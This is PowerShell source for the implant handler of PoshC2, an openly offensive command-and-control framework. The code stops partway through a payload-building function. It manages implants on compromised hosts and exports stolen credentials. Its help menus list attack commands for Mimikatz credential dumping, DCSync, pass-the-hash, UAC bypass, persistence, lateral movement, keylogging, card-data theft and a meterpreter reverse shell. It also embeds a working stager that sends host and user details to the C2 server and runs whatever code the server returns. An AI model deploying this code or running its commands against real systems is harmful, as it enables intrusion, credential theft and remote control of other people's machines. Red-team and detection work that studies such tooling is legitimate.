<#
        .Synopsis
        Implant-Handler cmdlet for the PowershellC2 to manage and deliver commands
        .DESCRIPTION
        Implant-Handler cmdlet for the PowershellC2 to manage and deliver commands
        .EXAMPLE
        ImplantHandler -FolderPath C:\Temp\PoshC2-031120161055
#>
function Implant-Handler
{
    [CmdletBinding(DefaultParameterSetName = "FolderPath")]
    Param
    (
        [Parameter(ParameterSetName = "FolderPath", Mandatory = $false)]
        [string]
        $FolderPath,
        [string]
        $PoshPath
    )

    if (!$FolderPath) {
        $FolderPath = Read-Host -Prompt `n'Enter the root folder path of the Database/Project'
    }

    # initiate defaults
    $Database = "$FolderPath\PowershellC2.SQLite"
    $p = $env:PsModulePath
    $p += ";$PoshPath\"
    $global:randomuri = $null
    $global:cmdlineinput = 'PS >'
    $global:implants = $null
    $global:implantid = $null
    $global:command = $null
    [Environment]::SetEnvironmentVariable("PSModulePath",$p)
    Import-Module -Name PSSQLite
    Import-Module "$PoshPath\Modules\ConvertTo-Shellcode.ps1"

    $c2serverresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM C2Server" -As PSObject
    $defaultbeacon = $c2serverresults.DefaultSleep
    $killdatefm = $c2serverresults.KillDate
    $IPAddress = $c2serverresults.HostnameIP 
    $DomainFrontHeader = $c2serverresults.DomainFrontHeader 
    $ipv4address = $c2serverresults.HostnameIP
    $serverport = $c2serverresults.ServerPort 
        
$head = '
<style>

body {
font-family: Verdana, Geneva, Arial, Helvetica, sans-serif;
}

table {
    table-layout: fixed;
    word-wrap: break-word;
    display: table;
    font-family: monospace;
    white-space: pre;
    margin: 1em 0;
}

th, td {
    text-align: left;
    padding: 8px;
}

tr:nth-child(even){background-color: #f2f2f2}

th {
    background-color: #4CAF50;
    color: white;
}
 
p { 
margin-left: 20px; 
font-size: 12px; 
}
 
</style>'

$header = '
<pre>
  __________            .__.     _________  ________  
  \_______  \____  _____|  |__   \_   ___ \ \_____  \ 
   |     ___/  _ \/  ___/  |  \  /    \  \/  /  ____/ 
   |    |  (  <_> )___ \|   Y  \ \     \____/       \ 
   |____|   \____/____  >___|  /  \______  /\_______ \
                      \/     \/          \/         \/
  ============ @benpturner & @davehardy20 ============
  ====================================================
</pre>'


    function startup 
    {
        Clear-Host
        $global:implants = $null
        $global:command = $null
        $global:randomuri = $null
        $global:implantid = $null
        $dbresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Implants WHERE Alive='Yes'" -As PSObject
        $global:implants = $dbresults.RandomURI

        # while no implant is selected
        while ($global:randomuri -eq $null)
        {
            Clear-Host
            Write-Host -Object ""
            Write-Host -Object ".___.              .__.                __          " -ForegroundColor Green
            Write-Host -Object "|   | _____ ______ |  | _____    _____/  |_  ______" -ForegroundColor Green
            Write-Host -Object "|   |/     \\____ \|  | \__  \  /    \   __\/  ___/" -ForegroundColor Green
            Write-Host -Object "|   |  Y Y  \  |_> >  |__/ __ \|   |  \  |  \___ \ " -ForegroundColor Green
            Write-Host -Object "|___|__|_|  /   __/|____(____  /___|  /__| /____  >" -ForegroundColor Green
            Write-Host -Object "          \/|__|             \/     \/          \/ " -ForegroundColor Green
            Write-Host "============== v2.9 www.PoshC2.co.uk ==============" -ForegroundColor Green
            Write-Host "===================================================" `n -ForegroundColor Green

            foreach ($implant in $dbresults) 
            { 
                $randomurihost = $implant.RandomURI
                $implantid = $implant.ImplantID
                $im_arch = $implant.Arch
                $im_user = $implant.User
                $im_hostname = $implant.Hostname
                $im_lastseen = $implant.LastSeen
                $im_pid = $implant.PID
                $im_sleep = $implant.Sleep
                $im_domain = $implant.Domain
                if ($randomurihost) {
                    if (((get-date).AddMinutes(-10) -gt $implant.LastSeen) -and ((get-date).AddMinutes(-59) -lt $implant.LastSeen)){
                        Write-Host "[$implantid]: Seen:$im_lastseen | PID:$im_pid | Sleep:$im_sleep | $im_domain @ $im_hostname ($im_arch)" -ForegroundColor Yellow
                    }
                    elseif ((get-date).AddMinutes(-59) -gt $implant.LastSeen){
                        Write-Host "[$implantid]: Seen:$im_lastseen | PID:$im_pid | Sleep:$im_sleep | $im_domain @ $im_hostname ($im_arch)" -ForegroundColor Red
                    }
                    else {
                        Write-Host "[$implantid]: Seen:$im_lastseen | PID:$im_pid | Sleep:$im_sleep | $im_domain @ $im_hostname ($im_arch)" -ForegroundColor Green
                    } 
                }
            }

            if (($HelpOutput) -and ($HelpOutput -eq "PrintMainHelp")){
                print-mainhelp
                $HelpOutput = $Null
            } 

            if (($HelpOutput) -and ($HelpOutput -ne "PrintMainHelp")){
                Write-Host ""
                Write-Host $HelpOutput -ForegroundColor Green
                $HelpOutput = $Null
            }

            $global:implantid = Read-Host -Prompt `n'Select ImplantID or ALL or Comma Separated List (Enter to refresh):'
            Write-Host -Object ""
            if (!$global:implantid) 
            {
                startup
            }
            if ($global:implantid -eq "Help"){
               $HelpOutput = "PrintMainHelp"
               startup
            }
            elseif ($global:implantid -eq "?"){
               $HelpOutput = "PrintMainHelp"
               startup
            }
            elseif ($global:implantid.ToLower().StartsWith("set-defaultbeacon")) 
            {
                [int]$Beacon = $global:implantid -replace "set-defaultbeacon ",""                                
                $HelpOutput = "DefaultBeacon updated to: $Beacon" 
                Invoke-SqliteQuery -DataSource $Database -Query "UPDATE C2Server SET DefaultSleep='$Beacon'"|Out-Null
                startup
            }
            elseif ($global:implantid -eq "automigrate-frompowershell")
            {
                $taskn = "LoadModule NamedPipe.ps1"
                $taskp = "LoadModule Invoke-ReflectivePEInjection.ps1"
                $taskm = "AutoMigrate"
                $Query = 'INSERT
                INTO AutoRuns (Task)
                VALUES (@Task)'
                
                Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
                Task = $taskn
                }
                Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
                Task = $taskp
                }
                Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
                Task = $taskm
                }
                $HelpOutput = "Added automigrate-frompowershell"
                startup      
            }
            elseif ($global:implantid -eq "AM")
            {
                $taskn = "LoadModule NamedPipe.ps1"
                $taskp = "LoadModule Invoke-ReflectivePEInjection.ps1"
                $taskm = "AutoMigrate"
                $Query = 'INSERT
                INTO AutoRuns (Task)
                VALUES (@Task)'
                
                Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
                Task = $taskn
                }
                Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
                Task = $taskp
                }
                Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
                Task = $taskm
                }
                $HelpOutput = "Added automigrate-frompowershell"
                startup      
            }
            elseif ($global:implantid -eq "L") 
            {
                $autorunlist = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM AutoRuns" -As PSObject
                foreach ($i in $autorunlist) {
                    $taskid = $i.TaskID
                    $taskname = $i.Task
                    $HelpOutput += "TaskID: $taskid | Task: $taskname `n"
                }             
                startup
            }
            elseif ($global:implantid -eq "list-autorun") 
            {
                $autorunlist = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM AutoRuns" -As PSObject
                foreach ($i in $autorunlist) {
                    $taskid = $i.TaskID
                    $taskname = $i.Task
                    $HelpOutput += "TaskID: $taskid | Task: $taskname `n"
                }             
                startup
            }
            elseif ($global:implantid -eq "nuke-autorun") 
            {
                Invoke-SqliteQuery -DataSource $Database -Query "Drop Table AutoRuns"
                
                $Query = 'CREATE TABLE AutoRuns (
                TaskID INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL UNIQUE,
                Task TEXT)'
                Invoke-SqliteQuery -Query $Query -DataSource $Database 
                startup
            }
            elseif ($global:implantid.ToLower().StartsWith("del-autorun")) 
            {
                $number = $global:implantid.Substring(12)
                $number = [int]$number
                if ($number  -match '^\d+$'){
                    Invoke-SqliteQuery -DataSource $Database -Query "DELETE FROM AutoRuns where TaskID='$number'"

                    $autorunlist = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM AutoRuns" -As PSObject
                    foreach ($i in $autorunlist) {
                        $taskid = $i.TaskID
                        $taskname = $i.Task
                        $HelpOutput += "TaskID: $taskid | Task: $taskname"
                    }
                
                    startup    
                }
                else
                {  
                    $HelpOutput = "Error not an integer"
                    startup
                }
            }
            elseif ($global:implantid.ToLower().StartsWith("add-autorun")) 
            {
                $tasker = $global:implantid.Substring(12)
                write-host "$tasker" -ForegroundColor Cyan
                $Query = 'INSERT
                INTO AutoRuns (Task)
                VALUES (@Task)'
                
                Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
                Task = $tasker
                }
                $HelpOutput = "Added autorun $tasker"
                startup                
            } elseif ($global:implantid.ToLower().StartsWith("output-to-html"))
            {
                $allcreds = Invoke-SqliteQuery -Datasource $Database -Query "SELECT * FROM Creds" -As PSObject
                $CredsArray = @()
                foreach ($cred in $allcreds) {
                    $CredLog = New-object PSObject | Select  CredsID, Username, Password, Hash
                    $CredLog.CredsID = $cred.CredsID;
                    $Credlog.Username = $cred.Username;
                    $CredLog.Password = $cred.Password;
                    $CredLog.Hash = $cred.Hash;
                    $CredsArray += $CredLog
                }
                $CredsArray | ConvertTo-Html -title "<title>Credential List from PoshC2</title>" -Head $head -pre $header -post "<h3>For details, contact X<br>Created by X</h3>" | Out-File "$FolderPath\reports\Creds.html"

               $allresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Implants" -As PSObject
               $ImplantsArray = @()
               foreach ($implantres in $allresults) {                  
                    $ImplantLog = New-Object PSObject | Select ImplantID, RandomURI, User, Hostname, IPAddress, FirstSeen, LastSeen, PID, Arch, Domain, Sleep
                    $ImplantLog.ImplantID = $implantres.ImplantID;
                    $ImplantLog.RandomURI = $implantres.RandomURI;
                    $ImplantLog.User = $implantres.User;
                    $ImplantLog.Hostname = $implantres.Hostname;
                    $ImplantLog.IPAddress = $implantres.IPAddress;
                    $ImplantLog.FirstSeen = $implantres.FirstSeen;
                    $ImplantLog.LastSeen = $implantres.LastSeen;
                    $ImplantLog.PID = $implantres.PID;
                    $ImplantLog.Arch = $implantres.Arch;
                    $ImplantLog.Domain = $implantres.Domain;
                    $ImplantLog.Sleep = $implantres.Sleep;
                    $ImplantsArray += $ImplantLog
               }

               $ImplantsArray | ConvertTo-Html -title "<title>Implant List from PoshC2</title>" -Head $head -pre $header -post "<h3>For details, contact X<br>Created by X</h3>" | Out-File "$FolderPath\reports\Implants.html"

               $allresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM CompletedTasks" -As PSObject
               $TasksArray = @()
               foreach ($task in $allresults) {                  
                    $ImplantTask = New-Object PSObject | Select TaskID, Timestamp, RandomURI, Command, Output
                    $ImplantTask.TaskID = $task.CompletedTaskID;
                    $ImplantTask.Timestamp = $task.TaskID;
                    $ImplantTask.RandomURI = $task.RandomURI;
                    $ImplantTask.Command = $task.Command;
                    $ImplantTask.Output = $task.Output;
                    $TasksArray += $ImplantTask
               }
               $TasksArray | ConvertTo-Html -title "<title>Tasks from PoshC2</title>" -Head $head -pre $header -post "<h3>For details, contact X<br>Created by X</h3>" | Out-File "$FolderPath\reports\ImplantTasks.html"
            } elseif ($global:implantid -eq "P")
            {
                start-process $FolderPath\payloads\payload.bat
                $HelpOutput = "Pwning self......"
                $HelpOutput
            } elseif ($global:implantid.ToLower().StartsWith("pwnself"))
            {
                start-process $FolderPath\payloads\payload.bat
                $HelpOutput = "Pwning self......"
                $HelpOutput
            } elseif ($global:implantid.ToLower().StartsWith("show-serverinfo"))
            {
                $HelpOutput  = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM C2Server" -As PSObject
                $HelpOutput
            } elseif ($global:implantid.ToLower().StartsWith("createproxypayload")) 
            {
                $HelpOutput = IEX $global:implantid
                $HelpOutput
            } elseif ($global:implantid.ToLower().StartsWith("listmodules")) 
            {
                Write-Host -Object "Reading modules from `$env:PSModulePath\* and $PoshPath\Modules\*"
                $folders = $env:PSModulePath -split ";" 
                foreach ($item in $folders) {
                    $PSmod = Get-ChildItem -Path $item -Include *.ps1 -Name
                    foreach ($mod in $PSmod)
                    {
                        $HelpOutput += $mod + "`n"
                    }
                }
                $listmodules = Get-ChildItem -Path "$PoshPath\Modules" -Name 
                foreach ($mod in $listmodules)
                {
                  $HelpOutput += $mod + "`n"
                }
                
                $HelpOutput
            }  
            elseif ($global:implantid.Contains(","))
            {
                $global:cmdlineinput = "PS $global:implantid>"
                break 
            } elseif ($global:implantid -eq "ALL") 
            {
                $global:cmdlineinput = "PS $global:implantid>"
                break
            } else 
            {
                $global:randomuri = Invoke-SqliteQuery -DataSource $Database -Query "SELECT RandomURI FROM Implants WHERE ImplantID='$global:implantid'" -as SingleValue
                $global:cmdlineinput = "PS $global:implantid>"   
            }
        }
    }

    $tick = "'"
    $speechmarks = '"'

     function print-mainhelp {
        write-host `n "Main Menu: " -ForegroundColor Green
        write-host "================================" -ForegroundColor Red
        write-host " Use Implant by <id>, e.g. 1"-ForegroundColor Green
        write-host " Use Multiple Implants by <id>,<id>,<id>, e.g. 1,2,5"-ForegroundColor Green
        write-host " Use ALL Implants by ALL" -ForegroundColor Green
        write-host `n "Auto-Runs: " -ForegroundColor Green
        write-host "=====================" -ForegroundColor Red
        write-host " Add-autorun <task>"-ForegroundColor Green
        write-host " List-autorun (Alias: L)"-ForegroundColor Green
        write-host " Del-autorun <taskID>"-ForegroundColor Green
        write-host " Nuke-autorun"-ForegroundColor Green
        write-host " Automigrate-FromPowershell (Alias: AM)"-ForegroundColor Green
        write-host `n "Server Commands: " -ForegroundColor Green
        write-host "=====================" -ForegroundColor Red
        write-host " Show-ServerInfo" -ForegroundColor Green 
        write-host " Output-To-HTML"-ForegroundColor Green
        write-host " Set-DefaultBeacon 60"-ForegroundColor Green
        write-host " ListModules " -ForegroundColor Green
        write-host " PwnSelf (Alias: P)" -ForegroundColor Green
        write-host " CreateProxyPayload -user <dom\user> -pass <pass> -proxyurl <http://10.0.0.1:8080>" -ForegroundColor Green  
    }

    function print-help {
        write-host `n "Implant Features: " -ForegroundColor Green
        write-host "=====================" -ForegroundColor Red
        write-host " Beacon 60s / Beacon 10m / Beacon 2h"-ForegroundColor Green 
        write-host " Turtle 60s / Tutle 30m / Turtle 8h "-ForegroundColor Green 
        write-host " Kill-Implant"-ForegroundColor Green 
        write-host " Hide-Implant"-ForegroundColor Green 
        write-host " Unhide-Implant"-ForegroundColor Green 
        write-host " Output-To-HTML"-ForegroundColor Green 
        write-host " Invoke-Enum"-ForegroundColor Green 
        write-host " Get-Proxy"-ForegroundColor Green 
        write-host " Get-ComputerInfo"-ForegroundColor Green 
        write-host " Add-Creds -Username <Username> -Password <Pass> -Hash <Hash>"-ForegroundColor Green 
        write-host " Dump-Creds"-ForegroundColor Green 
        write-host " Unzip <source file> <destination folder>"-ForegroundColor Green 
        write-host " Get-System" -ForegroundColor Green
        write-host " Get-System-WithProxy" -ForegroundColor Green 
        write-host " Get-ImplantWorkingDirectory"-ForegroundColor Green
        write-host " Get-Pid" -ForegroundColor Green 
        write-host " Get-Webpage http://intranet" -ForegroundColor Green 
        write-host " ListModules " -ForegroundColor Green
        write-host " ModulesLoaded " -ForegroundColor Green 
        write-host " LoadModule <modulename>" -ForegroundColor Green 
        write-host " LoadModule Inveigh.ps1" -ForegroundColor Green
        write-host " Invoke-Expression (Get-Webclient).DownloadString(`"https://module.ps1`")" -ForegroundColor Green
        write-host " StartAnotherImplant or SAI" -ForegroundColor Green 
        write-host " StartAnotherImplantWithProxy or SAIWP" -ForegroundColor Green 
        write-host " Invoke-DaisyChain -port 80 -daisyserver http://192.168.1.1 -c2server http://c2.goog.com -domfront aaa.clou.com -proxyurl http://10.0.0.1:8080 -proxyuser dom\test -proxypassword pass" -ForegroundColor Green
        write-host " CreateProxyPayload -user <dom\user> -pass <pass> -proxyurl <http://10.0.0.1:8080>" -ForegroundColor Green
        write-host " Get-MSHotfixes" -ForegroundColor Green 
        write-host " Get-FireWallRulesAll | Out-String -Width 200" -ForegroundColor Green 
        write-host " EnableRDP" -ForegroundColor Green
        write-host " DisableRDP" -ForegroundColor Green
        write-host " Netsh.exe advfirewall firewall add rule name=`"EnableRDP`" dir=in action=allow protocol=TCP localport=any enable=yes" -ForegroundColor Green
        write-host " Get-WLANPass" -ForegroundColor Green
        write-host " Get-WmiObject -Class Win32_Product" -ForegroundColor Green
        write-host " Get-CreditCardData -Path 'C:\Backup\'" -ForegroundColor Green
        write-host `n "Privilege Escalation: " -ForegroundColor Green
        write-host "====================" -ForegroundColor Red
        write-host " Invoke-AllChecks" -ForegroundColor Green
        write-host " Invoke-UACBypass" -ForegroundColor Green
        write-host " Invoke-UACBypassProxy" -ForegroundColor Green
        Write-Host ' Get-MSHotFixes | Where-Object {$_.hotfixid -eq "KB2852386"}' -ForegroundColor Green
        write-host " Invoke-MS16-032" -ForegroundColor Green 
        write-host " Invoke-MS16-032-ProxyPayload" -ForegroundColor Green 
        write-host " Get-GPPPassword" -ForegroundColor Green 
        write-host " Get-Content 'C:\ProgramData\McAfee\Common Framework\SiteList.xml'" -ForegroundColor Green
        write-host " Dir -Recurse | Select-String -pattern 'password='" -ForegroundColor Green
        write-host `n "File Management: " -ForegroundColor Green
        write-host "====================" -ForegroundColor Red
        write-host " Download-File -Source 'C:\Temp Dir\Run.exe'" -ForegroundColor Green
        write-host " Download-Files -Directory 'C:\Temp Dir\'" -ForegroundColor Green
        write-host " Upload-File -Source 'C:\Temp\Run.exe' -Destination 'C:\Temp\Test.exe'" -ForegroundColor Green  
        write-host " Web-Upload-File -From 'http://www.example.com/App.exe' -To 'C:\Temp\App.exe' " -ForegroundColor Green 
        write-host `n "Persistence: " -ForegroundColor Green
        write-host "================" -ForegroundColor Red
        write-host " Install-Persistence 1,2,3 " -ForegroundColor Green 
        write-host " Remove-Persistence 1,2,3" -ForegroundColor Green 
        write-host " Install-ServiceLevel-Persistence | Remove-ServiceLevel-Persistence" -ForegroundColor Green 
        write-host " Install-ServiceLevel-PersistenceWithProxy | Remove-ServiceLevel-Persistence" -ForegroundColor Green 
        write-host `n "Network Tasks / Lateral Movement: " -ForegroundColor Green
        write-host "==================" -ForegroundColor Red
        write-host " Get-ExternalIP" -ForegroundColor Green
        write-host " Test-ADCredential -Domain test -User ben -Password Password1" -ForegroundColor Green 
        write-host " Invoke-SMBLogin -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash/-Password" -ForegroundColor Green
        write-host " Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash/-Pass -Command `"net user SMBExec Winter2017 /add`"" -ForegroundColor Green
        write-host " Invoke-WMIExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash/-Pass -Command `"net user SMBExec Winter2017 /add`"" -ForegroundColor Green
        write-host " Net View | Net Users | Whoami /groups | Net localgroup administrators | Net Accounts /dom" -ForegroundColor Green  
        write-host ' Get-NetUser -Filter | Select-Object samaccountname,userprincipalname' -ForegroundColor Green 
        write-host ' Get-NetUser -Filter samaccountname=test' -ForegroundColor Green 
        write-host ' Get-NetUser -Filter userprinciplename=test@test.com' -ForegroundColor Green 
        write-host ' Get-NetGroup -GroupName "Domain Admins" | %{ Get-NetUser $_.membername } | %{ $a=$_.displayname.split(" ")[0..1] -join " "; Get-NetUser -Filter "(displayname=*$a*)" } | Select-Object -Property displayname,samaccountname' -ForegroundColor Green 
        write-host ' Get-DomainGroupMember -Recurse "Domain Admins" | Select MemberName' -ForegroundColor Green
        write-host `n "Domain Trusts: " -ForegroundColor Green
        write-host "==================" -ForegroundColor Red
        write-host " Get-NetDomain | Get-NetDomainController | Get-NetForestDomain" -ForegroundColor Green 
        write-host " Invoke-MapDomainTrust" -ForegroundColor Green 
        write-host ' Get-NetUser -domain child.parent.com -Filter samaccountname=test' -ForegroundColor Green 
        write-host ' Get-NetGroup -domain child.parent.com | select samaccountname' -ForegroundColor Green 
        write-host `n "Other Network Tasks: " -ForegroundColor Green
        write-host "==================" -ForegroundColor Red
        write-host ' Get-NetComputer | Select-String -pattern "Citrix" ' -ForegroundColor Green 
        write-host ' Get-NetGroup | Select-String -pattern "Internet" ' -ForegroundColor Green
        write-host " Get-BloodHoundData -CollectionMethod 'Stealth' | Export-BloodHoundCSV" -ForegroundColor Green
        write-host " Get-NetDomainController | Select name | get-netsession | select *username,*CName" -ForegroundColor Green
        write-host " Get-DFSshare | get-netsession | Select *username,*CName" -ForegroundColor Green
        write-host " Get-NetFileServer | get-netsession | Select *username,*CName" -ForegroundColor Green
        write-host " Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash" -ForegroundColor Green
        write-host " Get-DomainComputer -LDAPFilter `"(|(operatingsystem=*7*)(operatingsystem=*2008*))`" -SPN `"wsman*`" -Properties dnshostname,serviceprincipalname,operatingsystem,distinguishedname | fl" -ForegroundColor Green
        write-host " Write-SCFFile -IPaddress 127.0.0.1 -Location \\localhost\c$\temp\" -ForegroundColor Green
        write-host " Write-INIFile -IPaddress 127.0.0.1 -Location \\localhost\c$\temp\" -ForegroundColor Green
        write-host ' Get-NetGroup | Select-String -pattern "Internet" ' -ForegroundColor Green
        write-host " Invoke-Hostscan -IPRangeCIDR 172.16.0.0/24 (Provides list of hosts with 445 open)" -ForegroundColor Green
        write-host " Invoke-ShareFinder -hostlist hosts.txt" -ForegroundColor Green
        write-host " Get-NetFileServer -Domain testdomain.com" -ForegroundColor Green
        write-host " Find-InterestingFile -Path \\SERVER\Share -OfficeDocs -LastAccessTime (Get-Date).AddDays(-7)" -ForegroundColor Green
        write-host " Brute-AD" -ForegroundColor Green 
        write-host " Brute-LocAdmin -Username administrator" -ForegroundColor Green 
        Write-Host " Get-PassPol" -ForegroundColor Green
        Write-Host " Get-PassNotExp" -ForegroundColor Green
        Write-Host " Get-LocAdm" -ForegroundColor Green
        Write-Host " Invoke-Pipekat -Target <ip-optional> -Domain <dom> -Username <user> -Password '<pass>' -Hash <hash-optional>" -ForegroundColor Green
        Write-Host " Invoke-Inveigh -FileOutputDirectory C:\Temp\ -FileOutput Y -HTTP Y -Proxy Y -NBNS Y -Tool 1" -ForegroundColor Green
        Write-Host " Invoke-Sniffer -OutputFile C:\Temp\Output.txt -MaxSize 50MB -LocalIP 10.10.10.10" -ForegroundColor Green
        Write-Host " Invoke-SqlQuery -sqlServer 10.0.0.1 -User sa -Pass sa -Query 'SELECT @@VERSION'" -ForegroundColor Green
        Write-Host " Invoke-RunAs -cmd 'powershell.exe' -args 'start-service -name WinRM' -Domain testdomain -Username 'test' -Password fdsfdsfds" -ForegroundColor Green
        Write-Host " Invoke-RunAsPayload -Domain <dom> -Username 'test' -Password fdsfdsfds" -ForegroundColor Green
        Write-Host " Invoke-RunAsProxyPayload -Domain <dom> -Username 'test' -Password fdsfdsfds" -ForegroundColor Green
        write-host " Invoke-WMIExec -Target <ip> -Domain <dom> -Username <user> -Password '<pass>' -Hash <hash-optional> -command <cmd>" -ForegroundColor Green
        write-host " Invoke-WMIPayload -Target <ip> -Domain <dom> -Username <user> -Password '<pass>' -Hash <hash-optional>" -ForegroundColor Green
        write-host " Invoke-PsExecPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>" -ForegroundColor Green
        write-host " Invoke-PsExecProxyPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>" -ForegroundColor Green
        write-host " Invoke-WMIProxyPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>" -ForegroundColor Green
        write-host " Invoke-WMIDaisyPayload -Target <ip> -Domain <dom> -user <user> -pass '<pass>'" -ForegroundColor Green
        #write-host " EnableWinRM | DisableWinRM -computer <dns/ip> -user <dom\user> -pass <pass>" -ForegroundColor Green
        write-host " Invoke-WinRMSession -IPAddress <ip> -user <dom\user> -pass <pass>" -ForegroundColor Green
        write-host `n "Credentials / Tokens / Local Hashes (Must be SYSTEM): " -ForegroundColor Green
        write-host "=========================================================" -ForegroundColor Red
        write-host " Invoke-Mimikatz | Out-String | Parse-Mimikatz" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)sekurlsa::logonpasswords$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)lsadump::sam$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)lsadump::lsa$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)lsadump::cache$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)ts::multirdp$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)privilege::debug$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)crypto::capi$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)crypto::certificates /export$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)sekurlsa::pth /user:<user> /domain:<dom> /ntlm:<HASH> /run:c:\temp\run.bat$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Computer 10.0.0.1 -Command $($tick)$($speechmarks)sekurlsa::pth /user:<user> /domain:<dom> /ntlm:<HASH> /run:c:\temp\run.bat$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-TokenManipulation | Select-Object Domain, Username, ProcessId, IsElevated, TokenType | ft -autosize | Out-String" -ForegroundColor Green
        write-host ' Invoke-TokenManipulation -ImpersonateUser -Username "Domain\User"' -ForegroundColor Green
        write-host `n "Credentials / Domain Controller Hashes: " -ForegroundColor Green
        write-host "============================================" -ForegroundColor Red
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)lsadump::dcsync /domain:domain.local /user:administrator$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-DCSync -PWDumpFormat" -ForegroundColor Green
        write-host " Dump-NTDS -EmptyFolder <emptyfolderpath>" -ForegroundColor Green
        write-host `n "Useful Modules: " -ForegroundColor Green
        write-host "====================" -ForegroundColor Red
        write-host " Show-ServerInfo" -ForegroundColor Green 
        write-host " Get-Screenshot" -ForegroundColor Green
        write-host " Get-ScreenshotMulti -Timedelay 120 -Quantity 30" -ForegroundColor Green
        write-host " Get-RecentFiles" -ForegroundColor Green
        write-host " Cred-Popper" -ForegroundColor Green 
        write-host " Hashdump" -ForegroundColor Green 
        write-host ' Get-Keystrokes -LogPath "$($Env:TEMP)\key.log"' -ForegroundColor Green
        write-host " Invoke-Portscan -Hosts 192.168.1.1/24 -T 4 -TopPorts 25" -ForegroundColor Green
        write-host " Invoke-UserHunter -StopOnSuccess" -ForegroundColor Green
        write-host " Migrate-x64" -ForegroundColor Green
        write-host " Migrate-x64 -ProcID 4444" -ForegroundColor Green
        write-host " Migrate-x64 -NewProcess C:\Windows\System32\ConHost.exe" -ForegroundColor Green
        write-host " Migrate-x86 -ProcName lsass" -ForegroundColor Green
        write-host " Migrate-Proxypayload-x86 -ProcID 4444" -ForegroundColor Green
        write-host " Migrate-Proxypayload-x64 -ProcName notepad" -ForegroundColor Green
        write-host " Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 172.16.0.100 -Lport 443 -Force" -ForegroundColor Green
        write-host ' Get-Eventlog -newest 10000 -instanceid 4624 -logname security | select message -ExpandProperty message | select-string -pattern "user1|user2|user3"' -ForegroundColor Green
        write-host ' Send-MailMessage -to "itdept@test.com" -from "User01 <user01@example.com>" -subject <> -smtpServer <> -Attachment <>'-ForegroundColor Green
        write-host `n "Implant Handler: " -ForegroundColor Green
        write-host "=====================" -ForegroundColor Red
        write-host " Back" -ForegroundColor Green 
        write-host " Exit" `n -ForegroundColor Green 
    }

    # call back command
    $command = '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
function Get-Webclient ($Cookie) {
$d = (Get-Date -Format "dd/MM/yyyy");
$d = [datetime]::ParseExact($d,"dd/MM/yyyy",$null);
$k = [datetime]::ParseExact("'+$killdatefm+'","dd/MM/yyyy",$null);
if ($k -lt $d) {exit} 
$wc = New-Object System.Net.WebClient; 
$wc.UseDefaultCredentials = $true; 
$wc.Proxy.Credentials = $wc.Credentials;
$h="'+$domainfrontheader+'"
if ($h) {$wc.Headers.Add("Host",$h)}
$wc.Headers.Add("User-Agent","Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)")
if ($cookie) {
$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie")
} $wc }
function primer {
if ($env:username -eq $env:computername+"$"){$u="SYSTEM"}else{$u=$env:username}
$pre = [System.Text.Encoding]::Unicode.GetBytes("$env:userdomain\$u;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid")
$p64 = [Convert]::ToBase64String($pre)
$pm = (Get-Webclient).downloadstring("'+$ipv4address+":"+$serverport+'/connect?$p64")
$pm = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pm))
$pm } 
$pm = primer
if ($pm) {$pm| iex} else {
start-sleep 10
primer | iex }'

        function Get-RandomURI 
    {
        param (
            [int]$Length
        )
        $set    = 'abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray()
        $result = ''
        for ($x = 0; $x -lt $Length; $x++) 
        {
            $result += $set | Get-Random
        }
        return $result
    }

    # create payloads
    function CreatePayload 
    {
        $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
